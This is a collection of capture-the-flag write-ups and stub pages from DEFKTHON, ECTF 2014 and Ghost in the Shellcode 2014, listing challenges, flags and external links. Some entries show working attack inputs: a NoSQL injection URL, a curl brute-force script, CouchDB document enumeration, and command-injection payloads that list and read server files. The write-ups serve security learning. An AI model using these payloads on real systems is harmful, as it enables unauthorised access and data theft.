Using [the Firmware Modification Kit](https://code.google.com/p/firmware-mod-kit/) and executing `extract-firmware.sh 400.bin` successfully extracts the filesystem. Now the question is how and where the flag is hidden:

1. Is a special password configured somewhere? `grep -ri pass .`, nope.
2. Is a flag in plaintext hidden somewhere? `grep -ri flag .`, YES!

In the file `rootfs/etc/www` we encountered the line `</html>'flag is caputdraconis`. Hence the flag to solve this level is `caputdraconis`.

## Other write-ups and resources

* none yet
# DEFKTHON CTF: Web 100

**Description:**

> To get it; get the key and put it in my head!!
> [Secret Service](http://54.201.96.212:888/web100/)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# DEFKTHON CTF: Web 200

**Description:**

> [Auth Me In](http://54.201.96.212:888/web200/)

## Write-up

The hint [“Not SQL”](https://twitter.com/OpenSecurity_IN/status/440536455614443521) tells us not to look for SQL injection. After searching on the Internet about injections that are not an SQL injection, I came up with something called [a NoSQL injection](http://data.story.lu/2011/03/07/nosql-injection-in-mongo-php). A quick look at it and you will learn that, by appending `[$ne]` to the `$_GET` parameter, you can, instead make the query look for things that are ‘not equal’ to whatever you set the value to.

The final solution that resulted in the flag `flag{itoldunaathisisnotSQLinjection}` was `http://54.201.96.212:888/web200/?userid[$ne]=a&password[$ne]=a`.

## Other write-ups and resources

* <http://tasteless.eu/2014/03/defkthon-ctf-2014-web200-web300-and-web400-writeup/>
* [Japanese](http://hority-ctf.blogspot.jp/2014/03/defkthon-ctf-2014-write-up.html)
# DEFKTHON CTF: Web 300

**Description:**

> [we love it!](web300.apk)

## Write-up

We’re given an Android application package file, [`web300.apk`](web300.apk). `*.apk` files are essentially zip files with a different extension. If you rename it to `web300.apk.zip` and extract it, you’ll see it contains a `classes.dex` file. `*.dex` files are compiled Android application code files, containing bytecode for the Dalvik Virtual Machine (the workhorse powering the Android system).

Let’s convert the bytecode in the `classes.dex` file back to a `*.jar` file [using `dex2jar`](https://code.google.com/p/dex2jar/):

```bash
$ d2j-dex2jar web300.apk
dex2jar web300.apk -> web300-dex2jar.jar
```

Now, `\*.jar` files are essentially zip files too. We can just rename `web300-dex2jar.jar` to `web300-dex2jar.jar.zip` and unzip it to unpack its contents. Alternatively, this command has the same result:

```bash
$ jar xf web300-dex2jar.jar
```

In this case, the resulting source files aren’t easily readable, so let’s use a decompiler. Open `web300-dex2jar.jar` in [JD-GUI](http://jd.benow.ca/). Now we can view all the source code, or go to _File_ → _Save All Sources_ to save the sources so we can view them in our preferred text editor.

The `com.example.defkthonapp/MainActivity` class looks interesting:

```java
private Runnable Check = new Runnable()
{
  public void run()
  {
    TelephonyManager localTelephonyManager = (TelephonyManager)MainActivity.this.getSystemService("phone");
    String str1 = localTelephonyManager.getDeviceId();
    String str2 = localTelephonyManager.getSimSerialNumber();
    int i = new Random().nextInt(300);
    ((WebView)MainActivity.this.findViewById(2131230723)).postUrl("http://challenges.defconkerala.com/web/300/update.php", EncodingUtils.getBytes("pwd=" + Integer.toString(i) + "&imei=" + str1 + "&div=" + str2, "BASE64"));
  }
};
private EditText paswd;
```

So, the app performs a POST request to `http://challenges.defconkerala.com/web/300/update.php` with `pwd=$password&imei=$deviceID&div=$simSerialNumber` as POST data. The `$deviceID` and `$simSerialNumber` never change for the same device, only the `$password` does — and it is a random integer from 0 (inclusive) to 300 (exclusive).

Testing reveals that the `$deviceID` and `$simSerialNumber` aren’t validated in any way on the server, so we can just use bogus values for them. The `User-Agent` request header seems to be checked though — if it doesn’t contain `Android`, the following response is sent:

```
We love android !!
```

Setting `_Android` as the `User-Agent` header seems to work.

Let’s brute-force the password and see what happens. I wrote a quick shell script for this:

```bash
#!/usr/bin/env bash

deviceID='1337';
simSerialNumber='1337';
user_agent='_Android';

url='http://challenges.defconkerala.com/web/300/update.php';

for password in {0..299}; do
  data="pwd=${password}&imei=${deviceID}&div=${simSerialNumber}";
  curl -s --user-agent "${user_agent}" --data "${data}" "${url}" | grep 'Flag';
done;
```

Let’s run it:

```bash
$ ./web300.sh
Flag is: w00tkitk@t
```

The flag is `w00tkitk@t`.

## Other write-ups and resources

* <http://blog.0xdeffbeef.com/2014/03/defkthon-ctf-2014-we-love-it-web-300.html>
* <http://tasteless.eu/2014/03/defkthon-ctf-2014-web200-web300-and-web400-writeup/>
* [Japanese](http://wataamectf.blogspot.jp/2014/03/defkthon-ctf-writeup.html)
# DEFKTHON CTF: Web 400

**Description:**

> [Search Me](http://54.201.96.212:888/web400/web_search.php)

## Write-up

The `web_search.php` endpoint contains a form, and (by default) displays the following error message:

```
Error: Document ID is empty (errcode=0)
```

Let’s enter `test` in the search field and submit the form. [The response](http://54.201.96.212:888/web400/web_search.php?submit=Submit&search=test) contains:

```
Error: Object Not Found - missing (GET /astro_users/test []) (errcode=404)
```

[This error message format](https://www.google.com/search?q=%22Object%20Not%20Found%20-%20missing%22) is a hint that CouchDB is used.

CouchDB has [an `_all_docs` endpoint](http://couchdb.readthedocs.org/en/latest/api/database/bulk-api.html#get--db-_all_docs) that returns a list of all available documents in the database, in JSON format. (Note: [`_changes`](http://couchdb.readthedocs.org/en/latest/api/database/changes.html) could be used as well.) [Let’s take a look](http://54.201.96.212:888/web400/web_search.php?submit=Submit&search=_all_docs):

```
stdClass Object
(
    [total_rows] => 3
    [offset] => 0
    [rows] => Array
        (
            [0] => stdClass Object
                (
                    [id] => flag_for_l33ts
                    [key] => flag_for_l33ts
                    [value] => stdClass Object
                        (
                            [rev] => 4-f9d777fcf20c3fc52943aeba961593e9
                        )

                )

            [1] => stdClass Object
                (
                    [id] => userid1
                    [key] => userid1
                    [value] => stdClass Object
                        (
                            [rev] => 3-3125d533dea89836adec3b8a5a652030
                        )

                )

            [2] => stdClass Object
                (
                    [id] => userid2
                    [key] => userid2
                    [value] => stdClass Object
                        (
                            [rev] => 5-0090aa4c0db1f8d52a74d6134b2e48ef
                        )

                )

        )

)
```

`flag_for_l33ts` sounds interesting. [Let’s check it out](http://54.201.96.212:888/web400/web_search.php?submit=Submit&search=flag_for_l33ts):

```
stdClass Object
(
    [_id] => flag_for_l33ts
    [_rev] => 4-f9d777fcf20c3fc52943aeba961593e9
    [flag_for_l33ts_only] => flag{here_you_go_nice_solving_webChalLenges}
)
```

The flag is `here\_you\_go\_nice\_solving\_webChalLenges`.

## Other write-ups and resources

* <http://tasteless.eu/2014/03/defkthon-ctf-2014-web200-web300-and-web400-writeup/>
# ECTF 2014: A knotty problem

**Category:** Exploit
**Points:** 250
**Description:**

> When you reach the end of your rope, tie a knot in it and hang on — Franklin D. Roosevelt
>
> [`Knotty.tar.gz`](Knotty.tar.gz)
>
> `nc 212.71.235.214 5000`

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/ectf/write-ups/tree/master/ectf-2014/KnottyProblem#readme>
# ECTF 2014: Can You Be the Admin

**Category:** Crypto
**Points:** 300
**Description:**

> I’m derived with several alternating levels of substitutions and permutations.
>
> [Admin](http://212.71.235.214:8080/)
>
> **Hint:** This superse**des**

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/ectf/write-ups/tree/master/ectf-2014/CanYouBeTheAdmin>
# ECTF 2014: ECTF Hacked?

**Category:** Forensics
**Points:** 500
**Description:**

> Hello,
>
> I recently challenged a hacker to hack my site and it did not go very well :(
> We just got hacked and I have no idea what just happened. Apparently all user data has been leaked. Please find out what happened and help me out :(
>
> [`ECTF_Hacked.tar.gz`](ECTF_Hacked.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://shankaraman.wordpress.com/2014/10/19/ectf-2014-forensics-500-ectf-hacked-writeup/>
* <http://blog.rkravi.com/ectf-forensics500/>
# ECTF 2014: Eight Cats Hid the Flag

**Category:** Recon
**Points:** 100
**Description:**

> Find the flag.
>
> **Hint:** Have you learnt a version control system before? Because one of our team members says he has.

## Write-up

“Eight cats” is a hint at [Octocat, the official GitHub mascot](https://octodex.github.com/). We probably have to look for the flag on one of the CTF organizer’s GitHub repositories.

Cloning all of @karthiksenthil’s repositories and `grep`ping for a flag yields no results. There seems to be no other way of finding the flag except manually going through all commits, as the flag has been deleted from the source code. The commit in question was made a month before the CTF started, which made things a bit more difficult. By manually looking through all the commits we eventually found commit https://github.com/karthiksenthil/Learn-Git/commit/9cd4ecad6f7c545ef5ac31622d503de811191d7b which contains the flag `flag{0ctocat_c4n_play_h1de_and_s33k}`.

### Alternate solution

By searching the commit messages for the word “flag” the correct commit can quickly be found:

```bash
$ git clone https://github.com/karthiksenthil/Learn-Git && cd Learn-Git
Cloning into 'Learn-Git'...
remote: Counting objects: 1926, done.
remote: Compressing objects: 100% (984/984), done.
Rceiving objects:  66% (1272/1926), 916.00 KiB | 404.00 KiB/s
remote: Total 1926 (delta 863), reused 1926 (delta 863)
Receiving objects: 100% (1926/1926), 2.91 MiB | 576.00 KiB/s, done.
Resolving deltas: 100% (863/863), done.
Checking connectivity... done.
No submodule mapping found in .gitmodules for path 'courses/2'

$ git log --grep=flag
commit 9cd4ecad6f7c545ef5ac31622d503de811191d7b
Author: Karthik Senthil <karthik.senthil94@gmail.com>
Date:   Sat Sep 20 15:55:20 2014 +0530

    Removed flag :O

$ git show 9cd4ecad6f7c545ef5ac31622d503de811191d7b
commit 9cd4ecad6f7c545ef5ac31622d503de811191d7b
Author: Karthik Senthil <karthik.senthil94@gmail.com>
Date:   Sat Sep 20 15:55:20 2014 +0530

    Removed flag :O

diff --git a/LICENSE b/LICENSE
index 2200a82..89508a9 100644
--- a/LICENSE
+++ b/LICENSE
@@ -18,4 +18,3 @@ LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 THE SOFTWARE.

-flag{0ctocat_c4n_play_h1de_and_s33k}
```

## Other write-ups and resources

* <http://dhanvi1.wordpress.com/2014/10/23/eight-cats-hid-the-flag-ectf-2014-recon-100-writeup/>
# ECTF 2014: Friends of Crime

**Category:** Reverse Engineering
**Points:** 200
**Description:**

> Get the flag, my friend.
>
> [`friends_of_crime.tar.gz`](friends_of_crime.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/ectf/write-ups/tree/master/ectf-2014/FriendsOfCrime>
# ECTF 2014: H4cker Message

**Category:** Forensics
**Points:** 100
**Description:**

> A hacker is trying to communicate to his fellow hacker regarding a malicious event!
> We have managed to sniff his network activities from NSA.
> Help us find out what this message is.
>
> [`hacker_msg.tar.gz`](hacker_msg.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://shankaraman.wordpress.com/2014/10/19/ectf-2014-forensics-100-h4cker-message/>
* <https://github.com/ectf/write-ups/tree/master/ectf-2014/H4ckerMessage>
# ECTF 2014: Help Bob!

**Category:** Forensics
**Points:** 400
**Description:**

> Message from Bob:
>
> > Hello Hacker!
> > I am having troubles in finding the unique flag assigned to me.
> > Here are some files from my system.
> > Could you please help me out?
> >
> > [`help_bob.tar.gz`](help_bob.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://shankaraman.wordpress.com/2014/10/19/ectf-2014-forensics-400-help-bob-writeup/>
# ECTF 2014: I’m the Batman

**Category:** Crypto
**Points:** 100
**Description:**

> Batman is on the social networking site, he doesn’t reveal his name. Instead, for every user who requests his name he replies in a unique way (he gives a name specific to the person asking for his name) so do you know Batman’s name?
>
> `nc 212.71.235.214 7000`

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/ectf/write-ups/tree/master/ectf-2014/Batman>
# ECTF 2014: Login Please

**Category:** Web
**Points:** 200
**Description:**

> Can you get the flag?
>
> [Login Please](http://212.71.235.214:3000/)
>
> **Hint:** Favicon?

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/ectf/write-ups/tree/master/ectf-2014/LoginPlease>
# ECTF 2014: Low Key

**Category:** Crypto
**Points:** 150
**Description:**

> Hey!
> I just met you!
> And this is craazy!
> But here’s a product of prime numbers!
> Try me maybe!
> 2449
> P.S. My mother told me that the 7th key fits in the lock ;)
>
> **Hint:** Hint is implied in the question.
>
> [low_key.tar.gz](low_key.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/ectf/write-ups/tree/master/ectf-2014/LowKey>
# ECTF 2014: Meet the Team

**Category:** Recon
**Points:** 80
**Description:**

> Find the URL of the organizing team’s blog.
>
> **Hint:** Sorry! We didn’t have internet access to upload this clue :(

## Write-up

By Googling a bit about the CTF we find the name of the organizing team: _NIA_ (_No Internet Access_). So that’s what that hint was all about! Googling for the team name reveals their CTFTime page: <https://ctftime.org/team/8096>. That page has a link to their blog which is located at <http://nia-ctf.github.io/>.

## Other write-ups and resources

* <http://dhanvi1.wordpress.com/2014/10/23/meet-the-team-ectf-2014-recon-80/>
* <https://github.com/ectf/write-ups/tree/master/ectf-2014/MeetTheTeam>
# ECTF 2014: NRUG

**Category:** Web
**Points:** 500
**Description:**

> Hey,
>
> We are from the Newbie Ruby Users’ Group (NRUG).
> Please join us and share some of your 1337 skills! :)
>
> [NRUG](http://212.71.235.214:6050/)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ECTF 2014: Pixel Princess

**Category:** Forensics
**Points:** 200
**Description:**

> Find the princess. Get the flag.
>
> [`bowser.tar.gz`](bowser.tar.gz)

## Write-up

First we ran the `file` command on the given zip which showed that the zip is a gzip compressed data.

```
file bowser.tar.gz
bowser.tar.gz: gzip compressed data, from Unix, last modified: Thu Oct 16 04:54:39 2014
```

Running
```
tar -xzvf bowser.tar.gz
```

provides us with an image `bowser.jpg`

![bowser.jpg](images/bowser.jpg)

Running `strings` on the `jpg` file shows there is a file zipped in image

```
strings bowser.jpg
.
.
.
MarioCastle.jpgUT
>Tux
```

This gives a clue that image file `MarioCastle.jpg` compressed in `bowser.jpg` file might contain flag.

Running `unzip` command on `bowser.jpg` inflates the `MarioCastle.jpg` file.
![mariocastle.jpg](images/MarioCastle.jpg)

This first indicates that `MarioCastle.jpg` is also a zip file with password, but that leads to nothing. So another option is to use `steghide`

Running
```
steghide extract -sf MarioCastle.jpg
```

and entering password for `MarioCaste.jpg` returns nothing, so we tried `steghide` on original image `bowser.jpg` which works :) and gives a `tar.gz` file, which we extarct to get a jpg file with flag as `You_F0unD_m3`.

![flaga.jpg](images/flaga.jpg)

## Other write-ups and resources

* <https://shankaraman.wordpress.com/2014/10/19/ectf-2014-forensics-200-pixel-princess-writeup/>
* <http://apsdehal.in/blog/pixel-princess/># ECTF 2014: Potter

**Category:** Exploit
**Points:** 250
**Description:**

> You have been able to get your hands on the flag storing program of ECTF flag system. But you don’t have the required `libECTFsecret.so` file.
Can you still bypass the system?

> [`potter.zip`](potter.zip)
>
> `nc 212.71.235.214 3050`

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/ectf/write-ups/tree/master/ectf-2014/Potter>
* <http://itszn.com/blog/?p=11>
# ECTF 2014: Python

**Category:** Reverse Engineering
**Points:** 300
**Description:**

> Nokia decided to release a new version of their legacy snake game. Try your hand at it.
>
> [`python.tar.gz`](python.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/ectf/write-ups/tree/master/ectf-2014/Python>
# ECTF 2014 write-ups

* <http://ectf.in/>
* [Scoreboard](http://ectf.in/leaderboard)

## Completed write-ups

* [Eight Cats Hid the Flag](eight-cats-hid-the-flag)
* [Meet the Team](meet-the-team)
* [Pixel Princess](pixel-princess)

## External write-ups only

* [A knotty problem](a-knotty-problem)
* [Can You Be the Admin](can-you-be-the-admin)
* [ECTF Hacked?](ectf-hacked)
* [Friends of Crime](friends-of-crime)
* [H4cker Message](h4cker-message)
* [Help Bob!](help-bob)
* [I’m the Batman](im-the-batman)
* [Login Please](login-please)
* [Low Key](low-key)
* [Potter](potter)
* [Python](python)
* [Seddit](seddit)
* [T\_1000](t_1000)
* [The Annoying Admin](the-annoying-admin)
* [The Beginner](the-beginner)
* [The Sleepy Coder](the-sleepy-coder)
* [We Hate Engineering](we-hate-engineering)
* [Your ID, Your passwd](your-id-your-passwd)

## Missing write-ups

* [NRUG](nrug)
# ECTF 2014: Seddit

**Category:** Exploit
**Points:** 400
**Description:**

> Seddit has opened a new service to share posts and links through command line. Check it out here.
>
> [`seddit.tar.gz`](seddit.tar.gz)
>
> **Hint:** A pinch of \_\_\_\_
>
> `nc 212.71.235.214 6000`

## Write-up

(TODO)

## Other write-ups and resources

* <http://v0ids3curity.blogspot.in/2014/10/ectf-2014-seddit-exploit-400.html>
* <http://itszn.com/blog/?p=13/>
# ECTF 2014: The Annoying Admin

**Category:** Web
**Points:** 400
**Description:**

> The chat feature was added to Facelook website and to test it, founder of the company had sent a message in chat to the admin. Admin reads all the chat messages, but does not reply to anyone. Try to get that chat message and earn the bounty.
>
> [Annoying Admin](http://212.71.235.214:4050/)
>
> **Hint:** Admin likes to visit some links which he receives from people

## Write-up

(TODO)

## Other write-ups and resources

* <http://captnemo.in/blog/2014/10/20/ectf-web400-writeup/>
* <http://s0beit.me/ctf/ectf-2014-writeup-annoying-admin/>
* <https://github.com/hackerclub/writeups/blob/master/ectf-2014/Annoying-Admin-400/WRITEUP-mike_pizza.md>
# ECTF 2014: The Beginner

**Category:** Exploit
**Points:** 100
**Description:**

> The expert in anything was once a beginner
>
> [`beginner.tar.gz`](beginner.tar.gz)
>
> `nc 212.71.235.214 2000`

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/ectf/write-ups/tree/master/ectf-2014/Beginner>
# ECTF 2014: The Sleepy Coder

**Category:** Exploit
**Points:** 150
**Description:**

> The guy who was coding this was very sleepy. He has made some mistakes in the program. Can you exploit it?
>
> [`sleepy_coder.tar.gz`](sleepy_coder.tar.gz)
>
> `nc 212.71.235.214 4000`

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/ectf/write-ups/tree/master/ectf-2014/SleepyCoder>
# ECTF 2014: T_1000

**Category:** Recon
**Points:** 120
**Description:**

> Who made me?
>
> **Hint:** Do you know WhoIs T_1000?

## Write-up

(TODO)

## Other write-ups and resources

* <http://dhanvi1.wordpress.com/2014/10/23/t_1000-ectf-recon-120-writeup/>
* <https://github.com/ectf/write-ups/tree/master/ectf-2014/T_1000>
# ECTF 2014: We Hate Engineering

**Category:** Forensics
**Points:** 100
**Description:**

> Find the flag.
>
> [`huh_.wav`](huh_.wav)

## Write-up

(TODO)

## Other write-ups and resources

* <https://shankaraman.wordpress.com/2014/10/19/ectf-2014-forensics-100-we-hate-engineering-writeup/>
* <https://github.com/ectf/write-ups/tree/master/ectf-2014/WeHateEngineering>
# ECTF 2014: Your ID, Your passwd

**Category:** Reverse Engineering
**Points:** 100
**Description:**

> You have lost all memory of the love of your life.The only thing you know is that logging in this mysterious black-box will help you remember everything. Can you do it?
>
> [`your_id.tar.gz`](your_id.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/ectf/write-ups/tree/master/ectf-2014/YourIdYourPasswd>
# Ghost in the Shellcode 2014: A Boaring Quest

**Category:** Choose your Pwn Adventure 2
**Points:** 150
**Description:**

> Challenge available from within PwnAdventure2.

## Write-up

(TODO)

The flag is `ZombieProcessesWillEatYourBrains`.

## Other write-ups and resources

* <http://tasteless.eu/2014/01/gits-2014-a-boaring-quest-pwn-adventure-150/>
* <http://quangntenemy.blogspot.de/2014/01/ghost-in-shellcode-2014.html>
* <http://balidani.blogspot.de/2014/01/ghost-in-shellcode-2014-pwn-adventure-2.html>
# Ghost in the Shellcode 2014: Ad Subtract

**Category:** Choose your Pwn Adventure 2
**Points:** 75
**Description:**

> Challenge available from within PwnAdventure2.

## Write-up

The challenge (as explained by an in-game NPC) was to get rid of the ad diplayed in the Game Menu.

Traffic sniffing showed that after starting the game, a request was made to the domain `dontpanicsoftware.com` which delivered the ad images. Let’s route such requests to `localhost`, so we can serve a transparent PNG image instead:

```bash
$ echo '127.0.0.1 dontpanicsoftware.com # GitS2014: Ad Subtract' | sudo tee -a /etc/hosts

$ dscacheutil -flushcache && killall -HUP mDNSResponder
```

After restarting the game, the ads are now transparent/invisible. This reveals the underlying text: `AdBlockedHaveASillyMooseAnyway`.

## Other write-ups and resources

* <http://tasteless.eu/2014/01/gits-2014-ad-substract-pwn-adventure-75>
# Ghost in the Shellcode 2014: Boaring Music

**Category:** Choose your Pwn Adventure 2
**Points:** 50
**Description:**

> Find the key! [File](https://2014.ghostintheshellcode.com/boaringfield-6035032d25ae10f0005ac69379c0dd8d9b9b2a12)

## Write-up

In the _Choose Your Pwn Adventure 2_ game, the following additional hint is given:

![](game-screenshot.jpg)

> If you are bored with the boars, I hear there might be something hidden in the music over in the Boaring Field. Stay a while and listen!

(TODO)

The flag is `ASTARISBOARN`.

## Other write-ups and resources

* <http://nopsrus.blogspot.com/2014/01/ghost-in-shellcode-2014-pwn-adventure-2.html>
# Ghost in the Shellcode 2014: Byte Sexual

**Category:** Pwnable
**Points:** 600
**Description:**

> Endian isn’t the only thing that can be interchanged. [File](https://github.com/ctfs/write-ups/blob/master/ghost-in-the-shellcode-2014/byte-sexual/byte_sexual-838ca00502fd07d49dc319c4e78b6a94cee530a8) running at bytesexual.2014.ghostintheshellcode.com.

## Write-up

See [`exploit.py`](https://github.com/ctfs/write-ups/blob/master/ghost-in-the-shellcode-2014/byte-sexual/exploit.py).

(TODO)

The flag is `You really should not mix execution modes`.

## Other write-ups and resources

* [Source code for this challenge (released by the author after the CTF)](https://github.com/LightningTH/GiTS/blob/master/byte_sexual/lightning.py)
* <http://j00ru.vexillium.org/dump/ctf/byte_sexual.py>
* <https://rzhou.org/~ricky/byte_sexual.py>
# Ghost in the Shellcode 2014: Cave of Nope

**Category:** Choose your Pwn Adventure 2
**Points:** 50
**Description:**

> Challenge available from within PwnAdventure2.

## Write-up

The challenge was to enter the area called ‘Creepy Cave’, bridge a huge gap somehow, and then defeat the Spider Queen.

Crossing the gap can only be done after hacking the game files and increasing the player’s running speed or the jump velocity, for example.

To avoid getting killed by the Spider Queen, you could hack the _Wine_ item modifier, so that drinking wine makes you invulnerable (instead of just slightly boosting your damage resistance).

The flag is `At least it wasnt full of Creepers`.

## Other write-ups and resources

* <http://balidani.blogspot.com/2014/01/ghost-in-shellcode-2014-pwn-adventure-2.html>
# Ghost in the Shellcode 2014: CTF247

**Category:** Recon
**Points:** 100
**Description:**

> CTF247 is awesome <http://ctf247.2014.ghostintheshellcode.com/>

## Write-up

The `ami_id` parameter on [the ‘Fortress’ page](http://ctf247.2014.ghostintheshellcode.com/ec2.php) is vulnerable to command injection.

The response bodies for [`/ec2.php?ami_id=;ls;`](http://ctf247.2014.ghostintheshellcode.com/ec2.php?ami_id=;ls;) or [`/ec2.php?ami_id=%0als%0a`](http://ctf247.2014.ghostintheshellcode.com/ec2.php?ami_id=%0als%0a) start with:

```
ec2-api-tools-1.6.12.0
ec2.php
index.html
index_files
key.php
```

Aha! There’s a file named `key.php`. Let’s see what it says by visiting [`/ec2.php?ami_id=;cat%20key.php;`](http://ctf247.2014.ghostintheshellcode.com/ec2.php?ami_id=;cat%20key.php;) or [`/ec2.php?ami_id=%0acat%20key.php%0a`](http://ctf247.2014.ghostintheshellcode.com/ec2.php?ami_id=%0acat%20key.php%0a):

```php
<?php
  /* flag{0aea26e968895efa40b563e3e8fe8f19} */
  echo('There\'s a key here.');
?>
```

## Other write-ups and resources

* <http://blogs.tunelko.com/2014/01/19/ghost-in-the-shellcode-2014-write-up-ctf247/>
* <http://insertco.in/2014/01/19/ctf247-gits-2014/>
# Ghost in the Shellcode 2014: Dogecrypt

**Category:** Crypto
**Points:** 75
**Description:**

> Wow such crypto [Very download](https://github.com/ctfs/write-ups/blob/master/ghost-in-the-shellcode-2014/dogecrypt/dogecrypt-b36f587051faafc444417eb10dd47b0f30a52a0b) so xz.

## Write-up

(TODO)

The flag is `ShibeSuchDictionaryAttacksWow`.

## Other write-ups and resources

* <http://commandlinewani.blogspot.com/2014/01/ghostintheshellcode-write-up-dogecrypt.html>
* <http://digitaloperatives.blogspot.com/2014/01/ghost-in-shellcode-2014-crypto-75.html>
* <http://insertco.in/2014/01/19/dogecrypt-gits-2014>
* [Chinese](http://ddaa.logdown.com/posts/176606-gits-2014-crypto-dogecrypt)
# Ghost in the Shellcode 2014: DOS Attack

**Category:** Choose your Pwn Adventure 2
**Points:** 200
**Description:**

> What x86 instruction has been used to allow access to extended memory without ever entering protected mode?

## Write-up

The answer is `LOADALL`.
# Ghost in the Shellcode 2014: Fuzzy

**Category:** Pwnable
**Points:** 301
**Description:**

> We have developed a brand new "exploit mitigation" that makes it IMPOSSIBLE to reverse engineer our apps! [File](https://2014.ghostintheshellcode.com/fuzzy-29074b5fa6ed6aebb16390ef122ad61f7b9200ed) running at fuzzy.2014.ghostintheshellcode.com

## Write-up

(TODO)

The flag is `fuzzingIsFun2`.

## Other write-ups and resources

* <http://ppp.cylab.cmu.edu/wordpress/?p=1146>
* <https://blog.skullsecurity.org/2014/ghost-in-the-shellcode-fuzzy-pwnage-301>
# Ghost in the Shellcode 2014: gitsmsg

**Category:** Pwnable
**Points:** 299
**Description:**

> Find the key! [File](https://github.com/ctfs/write-ups/blob/master/ghost-in-the-shellcode-2014/gitsmsg/gitsmsg-04e8d34d76e3d6dedf79273dad97193377ecb3e3) running at gitsmsg.2014.ghostintheshellcode.com

## Write-up

(TODO)

The flag is `lol, tagged unions for the WIN!`.

## Other write-ups and resources

* <http://ppp.cylab.cmu.edu/wordpress/?p=1152>
* <https://blog.skullsecurity.org/2014/ghost-in-the-shellcode-gitsmsg-pwnage-299>
* <http://j00ru.vexillium.org/dump/ctf/gitsmsg.py># Ghost in the Shellcode 2014: Gitzino

**Category:** Crypto
**Points:** 400
**Description:**

> Like all good bitcoin casinos, the gitscoin casino gitzino uses unbreakable Provably Fair technology. [File](https://github.com/ctfs/write-ups/blob/master/ghost-in-the-shellcode-2014/gitzino/gitzino-2c5a188241c1c758e8bd7ef6dba254ccfebd965c) running at gitzino.2014.ghostintheshellcode.com

## Write-up

(TODO)

The flag is `Twister? I hardly knew her`.

## Other write-ups and resources

* <http://ppp.cylab.cmu.edu/wordpress/?p=1140>
# Ghost in the Shellcode 2014: inview

**Category:** Trivia
**Points:** 150
**Description:**

> The key is in view, what is it? [File](https://2014.ghostintheshellcode.com/inview-324b8fb59c14da0d5ca1fe2c31192d80cec8e155)

## Write-up

(TODO)

The flag is `WhitespaceProgrammingIsHard`.

## Other write-ups and resources

* <http://digitaloperatives.blogspot.com/2014/01/ghost-in-shellcode-2014-trivia-150.html>
* <http://delogrand.blogspot.com/2014/01/ghost-in-shellcode-2014-trivia.html>
* <http://yous.be/2014/01/20/ghost-in-the-shellcode-2014-inview-write-up/>
# Ghost in the Shellcode 2014: Long Live the Queen

**Category:** Choose your Pwn Adventure 2
**Points:** 250
**Description:**

> Find the key! [File](https://github.com/ctfs/write-ups/blob/master/ghost-in-the-shellcode-2014/long-live-the-queen/longlivethequeen-212e921161aed620a58ab6b7840f533ca343e650)

## Write-up

(TODO)

The flag is `TheyCallMeThePhaseBeast`.
# Ghost in the Shellcode 2014: lugkist

**Category:** Trivia
**Points:** 150
**Description:**

> Find the key. [File](https://2014.ghostintheshellcode.com/lugkist-3c99ed66685a73f333dde7cddfe5e9a4fd3651f0)

## Write-up

The headers of the provided `lugkist-3c99ed66685a73f333dde7cddfe5e9a4fd3651f0` file contain `7zXZ`, indicating it’s `xz`-compressed data.

So, extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < lugkist-3c99ed66685a73f333dde7cddfe5e9a4fd3651f0 > lugkist.txt`
* `unxz < lugkist-3c99ed66685a73f333dde7cddfe5e9a4fd3651f0 > lugkist.txt`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x lugkist-3c99ed66685a73f333dde7cddfe5e9a4fd3651f0
```

Then, … (TODO)

The flag is `Power overwhelming? Back in my day cheats did not have spaces.`.

## Other write-ups and resources

* <http://blog.zachorr.com/lugkist/>
* <http://commandlinewani.blogspot.com/2014/01/ghostintheshellcode-write-up-lugkist.html>
* <http://delogrand.blogspot.com/2014/01/ghost-in-shellcode-2014-trivia.html>
* <http://tasteless.eu/2014/01/gits-2014-lugkist-trivia-150>
* <https://systemoverlord.com/blog/2014/01/19/ghost-in-the-shellcode-2014-lugkist/>
* [Chinese](http://ddaa.logdown.com/posts/176382-gits-2014-trivia-150-lugkist)
# Ghost in the Shellcode 2014: Moon Boots

**Category:** Choose your Pwn Adventure 2
**Points:** 50
**Description:**

> Challenge available from within PwnAdventure2.

## Write-up

The challenge was to enter the Moon level somehow.

This can be done in several ways:

1. by hacking the gravity modifier, changing it from `-9.81` to, say, `0.5`
2. by hacking the initial jump velocity modifier, changing it to a value higher than `25`

That way, it’s possible to jump out of bounds on the regular map, which effectively teleports you to the moon.

The flag is `Use a Tab, Space will leave you breathless`.

## Other write-ups and resources

* <http://balidani.blogspot.com/2014/01/ghost-in-shellcode-2014-pwn-adventure-2.html>
# Ghost in the Shellcode 2014: one

**Category:** Recon
**Points:** 1
**Description:**

> What is the marking on the second train? <https://www.youtube.com/watch?v=6lutNECOZFw>

## Write-up

The marking on the second train is `SNC 52`. See <https://www.youtube.com/watch?v=6lutNECOZFw&t=1m04s>.

[![](screenshot.jpg)](https://www.youtube.com/watch?v=6lutNECOZFw&t=1m04s)
# Ghost in the Shellcode 2014: PapSmear

**Category:** Reverse Engineering
**Points:** 150
**Description:**

> Solve the challenge! [File](https://2014.ghostintheshellcode.com/pap_smear-1fb0104b24e15c5427281de92727f74c7a50fee5) running at papsmear.2014.ghostintheshellcode.com:7777

## Write-up

(TODO)

The flag is `ThesePrimesAreNotIllegal`.

## Other write-ups and resources

